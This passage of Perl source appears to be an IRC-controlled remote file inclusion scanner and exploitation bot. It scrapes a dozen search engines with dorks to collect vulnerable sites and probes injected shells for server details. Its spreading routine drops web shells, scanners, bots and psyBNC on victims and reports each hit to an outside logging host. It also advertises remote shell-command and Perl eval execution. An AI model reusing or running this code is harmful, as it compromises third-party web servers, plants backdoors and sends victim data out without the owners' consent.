  while ( $q =~ m/<span class=ngrn>(.*?) <\/span>/g ) { push (@daftar, $1); }
  while ( $q =~ /<a href=\"(.*?)\" target=\"_self\">Next/ ) {
    $nxurl = $murl.htmltourl($1);
    $q = bukasitus($nxurl);
    while ( $q =~ m/<span class=ngrn>(.*?) <\/span>/g ) { push (@daftar, $1); }
  }
  return @daftar;
}
##[ ALLTHEWEB ]##
sub se_alltheweb {
  my ($chan,$key,$nf) = @_;
  my @daftar;
  my $num = 100; my $max = 20; my $p = 1;
  #my $url = "http://localhost/search/www.alltheweb.com.htm";
  my $url = "http://www.alltheweb.com/search?cat=web&_sb_lang=any&hits=".$num."&q=".$key."&o=".$p;
  my $murl;
  my $nxurl;
  my $q = bukasitus($url);
  if ( $q =~ /<span class=\"ofSoMany\">(.+?)<\/span>/ ) {
    my $h = $1; $h =~ s/,//g; msgt($chan,"AllTheWeb","$h");
  }
  if ( $q =~ /<a  href=\"(.*?)\" class=\"rnavLink\">Next/ ) {
      my $nxurl = $1; msgn($dbgchan,"AllTheWeb","$nxurl");
  }
  while ( $q =~ m/<span class=\"resURL\">http:\/\/(.+?)<\/span>/g ) { push (@daftar, $1); }
  while ( $q =~ /<a  href=\"(.*?)\" class=\"rnavLink\">Next/ ) {
    $nxurl = $murl.htmltourl($1);
    $q = bukasitus($nxurl);
    while ( $q =~ m/<span class=\"resURL\">http:\/\/(.+?)<\/span>/g ) { push (@daftar, $1); }
  }
  return @daftar;
}
##[ GOODSEARCH ]##
sub se_goodsearch {
  my ($chan,$key,$nf) = @_;
  my @daftar;
  my $num = 0; my $max = 300; my $p = 1;
  #my $url = "http://localhost/search/www.goodsearch.com.html";
  my $url = "http://www.goodsearch.com/Search.aspx?Keywords=".$key."&page=".$p."&osmax=".$num;
  my $murl = "http://www.goodsearch.com/";
  my $nxurl;
  my $q = bukasitus($url);
  if ( $q =~ /of about <strong>(.+?)<\/strong>/ ) {
    my $h = $1; $h =~ s/,//g; msgt($chan,"GoodSearch","$h");
  }
  if ( $q =~ m/&nbsp;<span class=\"search_numberpager_nextprev\"><a href=\"(.+?)\">Next<\/a>/ ) {
      my $nxurl = $1; msgn($dbgchan,"GoodSearch","$nxurl");
  }
  while ( $q =~ m/<a href=\"(Redirect.+?)\">http:\/\/(.*?)<\/a>/g ) { push (@daftar, $2); }
  for ($p=2;$p<=$max;$p++) {
    $url = "http://www.goodsearch.com/Search.aspx?Keywords=".$key."&page=".$p."&osmax=".$num;
    $q = bukasitus($url);
    while ( $q =~ m/<a href=\"(Redirect.+?)\">http:\/\/(.*?)<\/a>/g ) { push (@daftar, $2); }
    if ( $q !~ m/<a href=\"(Redirect.+?)\">http:\/\/(.*?)<\/a>/g ) { return @daftar; }
  }
  return @daftar;
}
## UOL ##
sub se_uol {
  my ($chan,$key,$nf) = @_;
  my @daftar;
  my $num = 10; my $max = 5000; my $p;
  #my $url = "http://localhost/search/busca.uol.com.br.htm";
  my $url = "http://mundo.busca.uol.com.br/buscar.html?q=".$key."";
  my $murl = "http://busca.uol.com.br";
  my $nxurl;
  my $q = bukasitus($url);
  if ( $q =~ /results\">(.+?)<\/strong>/ ) {
    my $h = $1; $h =~ s/,//g; msgt($chan,"Uol","$h");
  }
  if ( $q =~ /<a href=\"(.*?)\" class=\"next\">/ ) {
      my $nxurl = htmltourl($1); msgn($dbgchan,"Uol","$nxurl");
  }
  while ( $q =~ m/<dt><a href=\"http:\/\/(.*?)\">/g ) { push (@daftar, $1); }
  for ($p=1;$p<=$max;$p += $num) {
    $q = bukasitus("http://mundo.busca.uol.com.br/buscar.html?q=".$key."&start=".$p);
    while ( $q =~ m/<dt><a href=\"http:\/\/(.*?)\">/g ) { push (@daftar, $1); }
    if ( $q !~ /<dt><a href/ ) { return @daftar; }
  }
  return @daftar;
}
## LIVE ##
sub se_live {
  my ($chan,$key,$nf) = @_;
  my @daftar;
  my $num = 10; my $max = 100; my $p;
  #my $url = "http://localhost/search/search.live.com.htm";
  my $url = "http://search.live.com/results.aspx?q=".$key."&go";
  my $murl =  "http://search.live.com";
  my $nxurl;
  my $q = bukasitus($url);
  if ( $q =~ /<a  class=\"sb_pagN\" href=\"(.*?)\" onmousedown/ ) {
      my $nxurl = $1; msgn($dbgchan,"Live",htmltourl($nxurl));
  }
  while ( $q =~ m/<h3><a href=\"http:\/\/(.*?)\"/g ) {
    my $l = $1 ; if ($l !~ /google/) { push (@daftar, $l); }
  }
  for ( $p=0;$p<=$max;$p += $num ) {
    $nxurl = $murl.htmltourl($1)."&go";
    $q = bukasitus("http://search.live.com/results.aspx?q=".$key."&first=".$p."&FORM=PORE");
    while ( $q =~ m/<h3><a href=\"http:\/\/(.*?)\"/g ) {
      my $l = $1 ; if ($l !~ /google/) { push (@daftar, $l); }
    }
  }
  return @daftar;
}
## CLUSTY ##
sub se_clusty {
  my ($chan,$key,$nf) = @_;
  my @daftar;
  my $num = 50;
  #my $url = "http://localhost/search/clusty.com.htm";
  my $url = "http://clusty.com/search?query=".$key."&input-form=clusty-simple&v:sources=webplus";
  my $murl = "http://clusty.com";
  my $nxurl;
  my $q = bukasitus($url);
  if ( $q =~ /intronum\">(.+?)<\/span>/ ) {
    my $h = $1; $h =~ s/,//g; msgt($chan,"Clusty","$h");
  }
  if ( $q =~ /<a class=\"listnext\" href=\"(.*?)\">next/ ) {
      my $nxurl = $1; msgn($dbgchan,"Clusty",htmltourl($nxurl));
  }
  while ( $q =~ m/<a target=\"_top\" href=\"http:\/\/(.*?)\"/g ) { push (@daftar, $1); }
  while ( $q =~ /<a class=\"listnext\" href=\"(.*?)\">next/ ) {
    $nxurl = $murl.htmltourl($1);
    $q = bukasitus($nxurl);
    while ( $q =~ m/<a target=\"_top\" href=\"http:\/\/(.*?)\"/g ) { push (@daftar, $1); }
  }
  return @daftar;
}
##[ ASK ]##
sub se_ask {
  my ($chan,$key,$nf) = @_;
  my @daftar;
  my $num = 50; my $max = 200; my $p = 1;
  #my $url = "http://localhost/search/www.ask.com.htm";
  my $url = "http://www.ask.com/web?q=".$key."&o=0&l=dir&page=".$p;
  my $murl = "http://www.ask.com/web";
  my $nxurl;
  my $q = bukasitus($url);
  if ( $q =~ /<a href=\"(.*?)\" class=\"(.+?)\" style=\"text-decoration:none\" >Next/ ) {
    my $h = $1; $h =~ s/,//g; msgn($dbgchan,"Ask","$h");
  }
  while ( $q =~ m/id=\"(.+?)\" href=\"http:\/\/(.+?)\" onmousedown/g ) {
    my $l = $2 ; if ($l !~ /google|www.ask.com/) { push (@daftar, $l); }
  }
  for ($p=1;$p<=$max;$p++) {
    $q = bukasitus("http://www.ask.com/web?q=".$key."&o=0&l=dir&page=".$p);
    while ( $q =~ m/id=\"(.+?)\" href=\"http:\/\/(.+?)\" onmousedown/g ) {
      my $l = $2 ; if ($l !~ /google|www.ask.com/) { push (@daftar, $l); }
    }
  }
  return @daftar;
}
## LYCOS ##
sub se_lycos {
  my ($chan,$key,$nf) = @_;
  my @daftar;
  my $num = 10; my $max = 200;  my $p;
  #my $url = "http://localhost/search/search.lycos.com.htm";
  my $url = "http://search.lycos.com/?loc=searchbox&tab=web&adf=on&query=".$key."&submit=image";
  my $murl =  "http://search.lycos.com/";
  my $nxurl;
  my $q = bukasitus($url);
  if ( $q =~ /<a href=\"(.*?)\">Next/ ) {
    my $nxurl = $1; msgn($dbgchan,"Lycos","$nxurl");
  }
  while ( $q =~ m/<a href=\"http:\/\/(.*?)\" onmouseover/g ) { push (@daftar, $1); }
  for ( $p=0;$p<=$max;$p++ ) {
    $q = bukasitus("http://search.lycos.com/?query=".$key."&page2=".$p."&tab=web");
    while ( $q =~ m/<a href=\"http:\/\/(.*?)\" onmouseover/g ) { push (@daftar, $1); }
    if ( $q !~ m/<a href=\"http:\/\/(.*?)\" onmouseover/g ) { return @daftar; }
  }
  return @daftar;
}
## GIGABLAST ##
sub se_gigablast {
  my ($chan,$key,$nf) = @_;
  my @daftar;
  my $num = 50; my $max = 5000;
  #my $url = "http://localhost/search/gigablast.com.htm";
  my $url = "http://www.gigablast.com/search?q=".$key."&n=".$max;
  my $murl = "http://www.gigablast.com";
  my $nxurl;
  my $q = bukasitus($url);
  if ( $q =~ /intronum\">(.+?)<\/span>/ ) {
    my $h = $1; $h =~ s/,//g; msgt($chan,"Gigablast","$h");
  }
  if ( $q =~ /<a class=\"navigation\" href="(.*?)\">/ ) {
      my $nxurl = $1; msgn($dbgchan,"Gigablast","$nxurl");
  }
  while ( $q =~ m/<a class=\"result-title\" href=\"http:\/\/(.*?)\">/g ) { push (@daftar, $1); }
  while ( $q =~ /<a class=\"navigation\" href="(.*?)\">/ ) {
    $nxurl = $murl.htmltourl($1);
    $q = bukasitus($nxurl);
    while ( $q =~ m/<a class=\"result-title\" href=\"http:\/\/(.*?)\">/g ) { push (@daftar, $1); }
  }
  return @daftar;
}
## MAMMA ##
sub se_mamma {
  my ($chan,$key,$nf) = @_;
  my @daftar;
  my $num = 50; my $max = 10; my $p = 1;
  #my $url = "http://localhost/search/mamma.com.htm";
  my $url = "http://mamma.com/Mamma?utfout=1&query=".$key."&qtype=0&rpp=50&cb=Mamma&index=".$p;
  my $murl;
  my $nxurl;
  my $q = bukasitus($url);
  if ( $q =~ /Search Results<\/b> .*? of (.*?) for/ ) {
    my $h = $1; $h =~ s/,//g; msgt($chan,"Mamma","$h");
  }
  if ( $q =~ /<a href=\"(.*?)\"><font color=#2A3383 face=verdana size=2>Next/ ) {
    my $h = $1; $h =~ s/,//g; msgn($dbgchan,"Mamma","$h");
  }
  while ( $q =~ m/http:\/\/(.*?)\<\/span>/g ) {
    my $l = $1 ; if ($l !~ /mamma.com/) { push (@daftar, $l); }
  }
  while ( $q =~ /<a href=\"(.*?)\"><font color=#2A3383 face=verdana size=2>Next/ ) {
    $nxurl = $murl.htmltourl($1);
    $q = bukasitus($nxurl);
    while ( $q =~ m/http:\/\/(.*?)\<\/span>/g ) {
      my $l = $1 ; if ($l !~ /mamma.com/) { push (@daftar, $l); }
    }
  }
  return @daftar;
}
## DMOZ ##
sub se_dmoz {
  my ($chan,$key,$nf) = @_;
  my @daftar;
  my $num = 20; my $max = 5000; my $p = 1;
  #my $url = "http://localhost/search/search.dmoz.org.htm";
  my $url = "http://search.dmoz.org/cgi-bin/search?search=".$key;
  my $murl = "http://search.dmoz.org/cgi-bin/";
  my $nxurl;
  my $q = bukasitus($url);
  if ( $q =~ /Open Directory Sites<\/b><\/font> \((.+?) of (.+?)\)/ ) {
    my $h = $2; $h =~ s/,//g; msgt($chan,"Dmoz","$h");
  }
  if ( $q =~ /<a href=\"(.*?)\">Next<\/a>\">/ ) {
      my $nxurl = $1; msgn($dbgchan,"Dmoz","$nxurl");
  }
  while ( $q =~ m/<li><a href=\"http:\/\/(.*?)\"/g ) { push (@daftar, $1); }
  while ( $q =~ /<a href=\"(.*?)\">Next<\/a>/ ) {
    $nxurl = $murl.htmltourl($1);
    $q = bukasitus($nxurl);
    while ( $q =~ m/<li><a href=\"http:\/\/(.*?)\"/g ) { push (@daftar, $1); }
  }
  return @daftar;
}
## VIRGILIO ##
sub se_virgilio {
  my ($chan,$key,$nf) = @_;
  my @daftar;
  my $num = 20; my $max = 2000; my $p = 0;
  my $url =  "http://ricerca.alice.it/ricerca?qs=".$key."filter=1&site=&lr=&hits=".$num."&offset=".$p;
  my $murl = "http://ricerca.alice.it/";
  my $nxurl;
  my $q = bukasitus($url);
  if ( $q =~ /<span>(.*?) risultati per <b>/ ) {
    my $h = $1; $h =~ s/,//g; $h =~ s/\.//g;
    msgt($chan,"Virgilio","$h");
  }
  if ( $q =~ /<a href=\".*\s+<a href=\"(.*?)\"><span>Avanti/ ) {
      my $nxurl = $1; msgn($dbgchan,"Virgilio","$nxurl");
  }
  while ( $q =~ m/<h3><a href=\"http:\/\/(.*?)\" class/g ) { push (@daftar, $1); }
  while ( $q =~ /<a href=\".*\s+<a href=\"(.*?)\"><span>Avanti/ ) {
    $nxurl = $murl.htmltourl($1);
    $q = bukasitus($nxurl);
    while ( $q =~ m/<h3><a href=\"http:\/\/(.*?)\" class/g ) { push (@daftar, $1); }
  }
  return @daftar;
}
## WEBDE ##
sub se_webde {
  my ($chan,$key,$nf) = @_;
  my @daftar;
  my $num = 1; my $max = 100; my $p;
  for ( $p = 0;$p <= $max; $p += $num ) {
    my $url = "http://suche.web.de/search/web/?pageIndex=".$p."&su=".$key."&y=0&x=0&mc=suche\@web\@navigation\@zahlen.suche\@web";
    my $q = bukasitus($url);
    while ( $q =~ m/<span class=\"url\">http:\/\/(.*?)<\/span>/g ) { push (@daftar, $1); }
    if ( $q !~ /<span class=\"url\">http:\/\/(.*?)<\/span>/ ) { return @daftar; }
  }
  return @daftar;
}
## FIREBALL ##
sub se_fireball {
  my ($chan,$key,$nf) = @_;
  my @daftar;
  my $num = 1; my $max = 500; my $p;
  for ( $p = 0;$p <= $max; $p += $num ) {
    my $url = "http://suche.fireball.de/cgi-bin/pursuit?pag=".$p."&query=".$key."&cat=fb_web&enc=utf-8";
    my $q = bukasitus($url);
    while ( $q =~ m/<a href=\"http:\/\/(.*?)\" target/g ) { push (@daftar, $1); }
    if ( $q !~ /<a href=\"http:\/\/(.*?)\" target/ ) { return @daftar; }
    if ( $q =~ /ergab keine Treffer in Deutsche Seiten/ ) { return @daftar; }
  }
  return @daftar;
}
## HOTBOT ##
sub se_hotbot {
  my ($chan,$key,$nf) = @_;
  my @daftar;
  my $num = 1; my $max = 200; my $p;
  for ( $p = 0;$p <= $max; $p += $num ) {
    my $url = "http://www.hotbot.com/?query=".$key."&ps=&loc=searchbox&tab=web&mode=search&currProv=msn&page=".$p;
    my $q = bukasitus($url);
    while ( $q =~ m/<span class=\"grn\">http:\/\/(.+?)<\/span>/g ) {
      my $l = $1 ; if ($l !~ /hotbot/) { push (@daftar, $l); }
    }
    if ( $q !~ /<span class=\"grn\">http:\/\/(.+?)<\/span>/ ) { return @daftar; }
  }
  return @daftar;
}
## NETSCAPE (Ga pake) ##
sub se_netscape {
  my ($chan,$key,$nf) = @_;
  my @daftar;
  my $num = 1; my $max = 10; my $p;
  for ( $p = 0;$p <= $max; $p += $num ) {
    my $url = "http://search.netscape.com/search/search?query=".$key."&page=".$p."&y=0&x=0&st=webresults";
    my $q = bukasitus($url);
    while ( $q =~ m/url\">http:\/\/(.*?)<\/p>/g ) {
      my $l = $1 ; if ($l !~ /search.netscape/) { push (@daftar, $l); }
    }
    if ( $q !~ /url\">http:\/\/(.*?)<\/p>/ ) { return @daftar; }
  }
  return @daftar;
}
## WEBCRAWLER ##
sub se_webcrawler {
  my ($chan,$key,$nf) = @_;
  my @daftar;
  my $num = 50; my $max = 500; my $p;
  for ( $p = 0;$p <= $max; $p++ ) {
    $num += $num;
    my $url = "http://www.webcrawler.com/webcrawler/ws/redir/qcat=Web/qkw=".$key."/qcoll=relevance/zoom=off/bepersistence=true/qi=".$num."/qk=50/page=".$p."/_iceUrlFlag=11?_IceUrl=true";
    my $q = bukasitus($url);
    while ( $q =~ m/status='http:\/\/(.*?)';/g ) {
      my $l = $1 ; if ($l !~ /webcrawler|google/) { push (@daftar, $l); }
    }
    if ( $q !~ /wsPagerNext/ ) { return @daftar; }
  }
  return @daftar;
}
## EUROSEEK ##
sub se_euroseek {
  my ($chan,$key,$nf) = @_;
  my @daftar;
  my $num = 10; my $max = 6000; my $p;
  for ( $p = 0;$p <= $max; $p+=$num ) {
    my $url = "http://euroseek.com/system/search.cgi?language=en&mode=internet&start=".$p."&string=".$key;
    my $q = bukasitus($url);
    while ( $q =~ m/<a href=\"http:\/\/(.+?)\" class=\"searchlinklink\">/g ) { push (@daftar, $1); }
    if ( $q !~ /Next/ ) { return @daftar; }
  }
  return @daftar;
}
## ABACHO ##
sub se_abacho {
  my ($chan,$key,$nf) = @_;
  my @daftar;
  my $num = 10; my $max = 1000; my $p = 0;
  for ( $p = 0;$p <= $max; $p += $num ) {
    my $url = "http://search.abacho.com/it/abacho.it/index.cfm?offset=".$p."&poffset=0&StartCounter=".$p."&q=".$key."&a=&b=&country=it&page=&d_html=&d_pdf=&d_msdoc=&d_xls=&d_ppt=&mesearchkey=&cluster=&coop=";
    my $q = bukasitus($url);
    while ( $q =~ m/target=\"_blank\">http:\/\/(.+?)<\/a>/g ) { push (@daftar, $1); }
    if ( $q !~ m/target=\"_blank\">http:\/\/(.+?)<\/a>/g ) { return @daftar; }
    if ( $q =~ /We didn't find any results matching your query/ ) { return @daftar; }
  }
  return @daftar;
}
## END OF RUTIN SEARCH ENGINE ##

##[ BUG JOOMLA ]##
sub bugjoomla {
  my $mode = $_[0];
  my @bugz;
  system("lwp-download ".$joomlaz);
  system("curl -O ".$joomlaz);
  system("wget ".$joomlaz);
  open(FILE,"< joomla.txt");
  if ($mode eq "hitung") {
    my $baris = 0; my $buff;
    while (sysread FILE, $buff, 4096) { $baris += ($buff =~ tr/\n//); }
    close FILE;
    f_hapus("joomla.txt*");
    return $baris;
  }
  else {
    while ( my $r = <FILE> ) { $r =~ s/\n//g; push(@bugz,$r); }
    close(FILE);
    f_hapus("joomla.txt*");
    return @bugz;
  }
}

##[ MILW0RM ]##
sub milw0rm {
  my ($chan,$key) = @_;
  my $max = 10; my $i;
  #my $q = bukasitus("http://localhost/milw0rm_rfi.htm");
  my $q = bukasitus("http://milw0rm.com/search.php?dong=".urlen($key));
  irc_msg($chan,"0,1 [milw0rm.com]9 $key ");
  while ( $q =~ m/<a href=\"\/exploits\/(.*?)\" target=\"_blank\" class=\"style14\">(.*?)<\/a>/g ) {
    $i++;
    my ($exp,$judul) = ($1,$2);
    irc_msg($chan,$colz{1}." $judul 15http://milw0rm.com/exploits/$exp ");
    sleep(1);
    return if ($i == $max);
  }
}

##[ BERSIH DORK ]##
sub bersihdork {
  my ($chan,$dork) = @_;
  if ( $dork =~ /inurl:|allinurl:|intext:|allintext:|intitle:|allintitle:/ ) {
    irc_msg($chan,$colz{1}." Membersihkan kata kunci Google.. ");
    $dork =~ s/^inurl://g;
    $dork =~ s/^allinurl://g;
    $dork =~ s/^intext://g;
    $dork =~ s/^allintext://g;
    $dork =~ s/^intitle://g;
    $dork =~ s/^allintitle://g;
  }
  return $dork;
}

##[ SORTIR LINK ]##
sub lnk_sortir {
  my @unik = ();
  my %ada  = ();
  foreach my $e ( @_ ) {
    next if $ada{ $e }++;
    push (@unik, $e);
  }
  return @unik;
}

##[ SARING LINK ]##
sub lnk_filter {
  my @unik = ();
  foreach my $url ( @_ ) {
    my $jelek = 0;
    foreach my $b ( @badlinkz ) {
      if ($url =~ /$b/) { $jelek = 1; }
    }
    if ($jelek == 0) { push (@unik, $url); }
  }
  return @unik;
}

##[ SUBLINK ]##
sub lnk_sub {
  my $link = $_[0];
  my (@links,$path);
  my ($host,@paths) = split(/\//,$link);
  $host .= "/";
  push (@links,$host);
  foreach my $e (@paths) {
    if ($e) {
      $path .= $e."/";
      my $sublink = $host.$path;
      push (@links,$sublink);
     }
  }
  return @links;
}

##[ INFO OS ]##
sub info_os {
  my $url = $_[0];
  my @info;
  my $h  = bukasitus($url.$fx29id2."??");
  my ($safe,$os,$uname,$server,$user,$uid,$dir,$perm,$hdd,$disfunc);
  while ( $h =~ m/<br>SAFE: (.+?)<br>/g ) { $safe = $1; }
  while ( $h =~ m/<br>OS: (.+?)<br>/g ) { $os = $1; }
  while ( $h =~ m/<br>UNAME: (.+?)<br>/g ) { $uname = $1; }
  while ( $h =~ m/<br>SERVER: (.+?)<br>/g ) { $server = $1; }
  while ( $h =~ m/<br>USER: (.+?)<br>/g ) { $user = $1; }
  while ( $h =~ m/<br>UID: (.+?)<br>/g ) { $uid = $1; }
  while ( $h =~ m/<br>DIR: (.+?)<br>/g ) { $dir = $1; }
  while ( $h =~ m/<br>PERM: (.+?)<br>/g ) { $perm = $1; }
  while ( $h =~ m/<br>HDD: (.+?)<br>/g ) { $hdd = $1; }
  while ( $h =~ m/<br>DISFUNC: (.+?)<br>/g ) { $disfunc = $1; }
  push (@info,$safe,$os,$uname,$server,$user,$uid,$dir,$perm,$hdd,$disfunc);
  return @info;
}

##[ SAFEMODE INFO ]##
sub safemode {
  my ($type,$chan,$situs,$bug,$engine) = @_;
  my $safemode; my $vurn; my $sb;
  if ($type == 1) { $vurn = "http://".$situs.$bug; $sb = $vurn."14".$fx29sh."?"; }
  else { $vurn = $situs; $sb = $vurn; }
  my ($safe,$os,$uname,$server,$user,$uid,$dir,$perm,$hdd,$disfunc) = info_os($vurn);
  if ($safe =~ /OFF/) { $safemode = "4OFF"; } elsif ($safe =~ /ON/) { $safemode ="9ON"; } else { $safemode ="0-"; }
  if ($disfunc) { $disfunc = "9[Disfunc]0[7 $disfunc 0]"; } else { $disfunc = ""; }
  if ($perm =~/W/) { $perm = "12$perm"; } else { $perm = "4$perm"; }
  my $S1 = "9,1 [".$safemode."9]9[$os]0[ $sb 0]";
  my $S2 = "9,1 [Uname]0[ $uname ]9 [User]0[ $user / $uid ] 9[Server]0[ $server ] ";
  my $S3 = "9,1 [Dir]0[ $dir $perm 0] 9[HDD]0[0 $hdd 0] $disfunc ";
  if ($type == 1) {
    irc_msg($chanx,$S1); irc_msg($chanx,$S2); irc_msg($chanx,$S3);
    ##[ SPREADING ]##
    my $q = bukasitus($vurn.$spread."?&modez=shellz");
    if ($q =~ /Writed to (.+?)!/) { irc_msg($chanx,"9,1 [Shell]0[ $1 0] "); }
    bukasitus("http://uaedesign.com/xml/logz/loggerz.php?&safe=".$safe."&teks=".urlen($vurn));
    bukasitus($vurn.$spread."?&modez=scannerz");
    bukasitus($vurn.$spread."?&modez=botz");
    bukasitus($vurn.$spread."?&modez=psybnc");
    sleep($conf{sleepz});
    irc_msg($chan,$colz{3}.$engine.$colz{4}) if ($engine);
  }
  irc_msg($chan,$S1); irc_msg($chan,$S2); irc_msg($chan,$S3);
}

##[ CEK SHELL ]##
sub cek_shell {
  my ($chan,$nick,$situs) = @_;
  my $q = bukasitus($situs.$fx29id."?");
  print $q;
  if ( $q =~ /FeeLCoMz/ ) { safemode(2,$chan,$situs,"",""); }
  else { irc_msg($chan,$nick.", targetnya ga vurnerable!"); }
}

##[ CEK RESPON ]##
sub cek_respon {
  my $chan = $_[0];
  my ($q1,$q2,$q3) = (bukasitus($fx29id),bukasitus($fx29id2),bukasitus($fx29sh));
  my ($rid,$rid2,$rsh,$stat);
  if ( $q1 =~ /Fx29ID/ ) { $rid = "9Perawan!"; $stat = 1; } else { $rid = "4Pelacur!"; $stat = 0; }
  if ( $q2 =~ /Fx29ID/ ) { $rid2 = "9Perawan!"; $stat += 1; } else { $rid2 = "4Pelacur!"; $stat += 0; }
  if ( $q3 =~ /FaTaLisTiCz_Fx/ ) { $rsh = "9Perawan!"; } else { $rsh = "4Pelacur!"; }
  irc_msg($chan,$colz{1}."10Nenek: $rid 10Emak: $rid2 10Anak: $rsh".$colz{2});
  return $stat;
}

##[ CEK DORK ]##
sub cek_dork {
  my $dork = $_[0];
  foreach my $d (@baddorkz) { if ($dork =~ /$d/) { return 1; } }
  return 0;
}

##[ CEK BUG ]##
sub cek_bug {
  my $bug = $_[0];
  foreach my $b (@badbugz) { if ($bug =~ /$b/) { return 1; } }
  return 0;
}

##[ RUTIN PENANGANAN FILE ]##
sub f_hapus { my $file = $_[0]; system("rm $file"); }
sub f_simpan {
  my ($nf,$hc) = @_;
  my $fh;
  open( $fh, ">>", $nf );
  my @slink = lnk_sub($hc);
  foreach my $s (@slink) { print $fh "$s\n"; }
  close $fh;
}
sub f_simpan2 {
  my ($nf,$isi) = @_;
  my $fh;
  open( $fh, ">", $nf ); print $fh "$isi\n"; close $fh;
}
sub f_simpan2b {
  my ($nf,$isi) = @_;
  my $fh;
  open( $fh, ">>", $nf ); print $fh "$isi\n"; close $fh;
}

##[ HTTP QUERY ]##
sub bukasitus {
  my $url = $_[0];
  my $request = HTTP::Request->new(GET => $url);
  my $ua  = LWP::UserAgent->new;
  $ua->timeout($conf{timeout});
  $ua->agent('Mozilla/5.0');
  my $response = $ua->request($request);
  if ($response->is_success) { return $response->content; }
  else { return $response->status_line; }
}
sub bukasitus2 {
  my $url = $_[0];
  my $ua  = LWP::UserAgent->new;
  $ua->timeout($conf{timeout});
  $ua->agent('Mozilla/5.0');
  my $response = $ua->get($url);
  if ($response->is_success) { return $response->content; }
  else { return $response->status_line; }
}
sub bukasitus3 {
  my $url = $_[0];
  my $host  = $url;
  my $query = $url;
  my $isi; my $kirim;
  my $uagent  = "Mozilla/5.0";
  $host  =~ s/http:\/\/([-a-zA-Z0-9\.]+)\/.*/$1/;
  $query =~ s/$host//;
  eval {
    my $sock = IO::Socket::INET->new(PeerAddr => "$host",PeerPort => "80",Proto => "tcp") || return;
    $kirim = "GET ".$query." HTTP/1.1\r\nHost: ".$host."\r\nAccept: */*\r\nUser-Agent: ".$uagent."\r\n\r\n";
    print $sock $kirim;
    my @r = <$sock>;
    $isi = "@r";
    close($sock);
  };
  return $isi;
}

##[ ENCODE/DECODE ]##
sub htmltourl { my $str = $_[0]; $str =~ s/&amp;/&/g; return $str; }
sub urlen {
  my $str = $_[0];
  #$str =~ s/\+/\%2B/g;
  $str =~ s/ /\+/g;
  $str =~ s/@/\%40/g;
  $str =~ s/\//\%2F/g;
  $str =~ s/&/\%26/g;
  $str =~ s/\"/\%22/g;
  $str =~ s/,/\%2C/g;
  $str =~ s/\\/\%5C/g;
  $str =~ s/:/\%3A/g;
  $str =~ s/\[/\%5B/g;
  $str =~ s/\]/\%5D/g;
  $str =~ s/\?/\%3F/g;
  $str =~ s/\=/\%3D/g;
  $str =~ s/\|/\%7C/g;
  return $str;
}
sub urlde {
  my $str = $_[0];
  $str =~ s/\+/ /g;
  $str =~ s/\%2B/\+/g;
  $str =~ s/\%40/@/g;
  $str =~ s/\%2E/\./g;
  $str =~ s/\%2F/\//g;
  $str =~ s/\%26/&/g;
  $str =~ s/\%22/\"/g;
  $str =~ s/\%2C/,/g;
  $str =~ s/\%5C/\\/g;
  $str =~ s/\%3A/:/g;
  $str =~ s/\%5[B|b]/\[/g;
  $str =~ s/\%5[D|d]/\]/g;
  $str =~ s/\%3F/\?/g;
  $str =~ s/\%3D/\=/g;
  $str =~ s/\%7C/\|/g;
  return $str;
}
sub cryptz { return crypt($_[0],"feelcomz"); }

##[ TRIMMER CRLF ]##
sub trimrn {
  my $str = $_[0];
  if (!$str) { return ""; }
  $str =~ s/\r// if ($str);
  $str =~ s/\n//;
  return $str;
}

##[ INFO BOT ]##
sub bot_info   {
  my $chan   = $_[0];
  my $hlogo  = "0,1 [i]9 ";
  my $uname  = `uname -a`;
  my $uid    = `id`;
  my $uptime = `uptime`;
  my @info   = (
  $hlogo."0Oxyde0s RFI Scanner $versi Info ",
  $hlogo."Written under 0ActivePerl 5.8.8 Build 820 9by 4Jh0Ns (Library Community) ",
  $hlogo."Uname:0 $uname ",
  $hlogo."Uid:0 $uid ",
  $hlogo."Uptime:0 $uptime ",
  );
  foreach my $m(@info) { irc_msg($chan,$m); }
}

##[ HELP BOT ]##
sub bot_help {
  my ($chan,$level) = @_;
  my $hsepz = "8,1 [4Jh0Ns8] 10";
  my $hlogo = "8,1 [4Jh0Ns8] 9".$cmdpre;
  my @help; my $i;
  my @hlp1 = (
  $hsepz."Library RFI Scanner $versi Help ",
  $hlogo."scan|scan2 <bug> <dork> 0Ã¯Â¿Â½15 Memulai scanner | scanner & Eksploit RFI ",
  $hlogo."milw0rm <keywords> 0Ã¯Â¿Â½15 Mencari daftar bug di milw0rm ",
  $hlogo."respon 0Ã¯Â¿Â½15 Cek Respon & Injector RFI ",
  $hlogo."urlen|urlde <teks> 0Ã¯Â¿Â½15 Encoder/Decoder URL ",
  $hlogo."cek <target> 0Ã¯Â¿Â½15 Cek RFI shell ",
  $hlogo."info 0Ã¯Â¿Â½15 Informasi bot ",
  $hlogo."auth <password> 0Ã¯Â¿Â½15 Login ke bot ",
  );
  my @hlp2 = (
  $hsepz."User Commands: ",
  $hlogo."joomla <bug> <dork> 0Ã¯Â¿Â½15 Memulai scanner & Eksploit RFI Joomla ",
  $hlogo."hitung <jumlah> 0Ã¯Â¿Â½15 Mengganti hitungan proses eksploitasi ",
  $hlogo."cryptz <password> 0Ã¯Â¿Â½15 Membuat password yg terenkripsi ",
  $hlogo."join|part <channel> 0Ã¯Â¿Â½15 Join/Part channel ",
  $hlogo."nick <nick> 0Ã¯Â¿Â½15 Ganti nick bot ",
  $hlogo."logout 0Ã¯Â¿Â½15 Logout dari bot ",
  );
  my @hlp3 = (
  $hsepz."Admin Commands: ",
  $hlogo."crespon[1/2]|cshell|cspread <url> 0Ã¯Â¿Â½15 Mengganti respon/injector/spread/spread2 RFI ",
  $hlogo."rfipid <perintah> 0Ã¯Â¿Â½15 Mengganti RFI PID ",
  $hlogo."spy 0Ã¯Â¿Â½15 Menampilkan konfigurasi Spy ",
  $hlogo."spyhost <your chan> 0Ã¯Â¿Â½15 Channel host buat spy ",
  $hlogo."spychan <chan> 0Ã¯Â¿Â½15 Channel yang akan di spy ",
  $hlogo."spyword <regex> 0Ã¯Â¿Â½15 Kata yg di akan spy ",
  $hlogo."raw <perintah> 0Ã¯Â¿Â½15 Perintah Raw IRC ",
  $hlogo."cmd <perintah shell> 0Ã¯Â¿Â½15 Mengeksekusi perintah di shell ",
  $hlogo."eval <kode perl> 0Ã¯Â¿Â½15 Mengeksekusi kode perl ",
  $hlogo."quit 0Ã¯Â¿Â½15 Quit dari IRC ",
  $hlogo."keluar 0Ã¯Â¿Â½15 Quit dari IRC & Matikan semua proses Perl ",
  );
  if    ( $level == 1 ) { push(@help,@hlp1); }
  elsif ( $level == 2 ) { push(@help,@hlp2); }
